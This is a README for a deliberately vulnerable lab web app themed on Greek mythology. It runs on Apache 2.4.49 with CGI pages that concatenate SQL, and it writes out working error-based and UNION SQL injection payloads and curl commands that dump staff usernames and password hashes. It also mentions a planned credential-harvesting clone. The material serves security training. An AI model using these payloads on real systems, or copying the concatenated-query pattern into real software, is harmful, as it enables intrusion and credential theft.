# VictimWeb

Themed target web app for an **isolated** cybersecurity lab assessment
(Greek mythology / "House of Hades"), served by Apache 2.4.49 compiled
from source at `/opt/apache-2.4.49` on an Ubuntu VM.

> WARNING: Apache 2.4.49 is vulnerable (CVE-2021-41773 / CVE-2021-42013) and
> the pages below are intentionally vulnerable to SQL injection.
> Use only inside a host-only VM. Never expose it to the internet.

## Targets

Both pages query PostgreSQL with concatenated, non-parameterised SQL and
print raw DB errors, so **UNION-based and error-based** injection both work.

| Page | Query target | Extracts |
|---|---|---|
| `htdocs/login.html` + `cgi-bin/login.py` | `wardens` (staff auth) | All staff users via error-based injection (verbose DB errors) |
| `cgi-bin/admissions.py` | `souls` (public search) | Admissions records; `wardens` via UNION |

Valid login (after cracking the hashes): `charon` / `ferryman`.

## Layout

```
htdocs/     -> /opt/apache-2.4.49/htdocs/     (login.html)
cgi-bin/    -> /opt/apache-2.4.49/cgi-bin/     (login.py, admissions.py)
db/         run on the VM to build the PostgreSQL DB
deploy.sh   copies htdocs/ and cgi-bin/ into Apache and restarts
```

## Setup on the Ubuntu VM

```bash
git clone git@github.com:USERNAME/VictimWeb.git ~/VictimWeb
cd ~/VictimWeb
sudo ./deploy.sh          # web + CGI into Apache
sudo ./db/setup_db.sh     # PostgreSQL + data
```

Requires `mod_cgid` loaded in `httpd.conf` so the `.py` CGI scripts execute.

## Database

- PostgreSQL. DB `underworld`, app role `hades_app` / `styx` (over-privileged on purpose).
- Tables: `souls` (public records) and `wardens` (staff creds, md5, crackable).
- Driver: `python3-psycopg2` (installed by the setup script).

## SQL injection — login (error-based)

The login looks normal: it greets you on success and denies you on failure,
and **never shows a user table**. But the DB prints raw errors, so you force
an error that leaks the data. Put this in the **Keeper ID** field (any passphrase):
```
' AND 1=CAST((SELECT string_agg(username||':'||password_hash, ', ') FROM wardens) AS int)--
```
PostgreSQL throws `invalid input syntax for type integer: "charon:...,"` — every
user leaked in the error message.

With curl:
```bash
curl -s http://localhost/cgi-bin/login.py \
  --data-urlencode "username=' AND 1=CAST((SELECT string_agg(username||':'||password_hash,', ') FROM wardens) AS int)--" \
  --data-urlencode "password=x"
```

Valid login (after cracking the hashes): `charon` / `ferryman`.

## Admissions search (data extraction)

```bash
curl -G "http://localhost/cgi-bin/admissions.py" --data-urlencode "q=sisyphus"
curl -G "http://localhost/cgi-bin/admissions.py" \
  --data-urlencode "q=zzz' UNION SELECT username, email, password_hash FROM wardens--"
```

## Notes

- Deliberately insecure training material for a controlled, offline lab.
- The fake credential-harvesting clone of the login (assessment phase 3) is
  a separate page to be built later; this login is the original system.
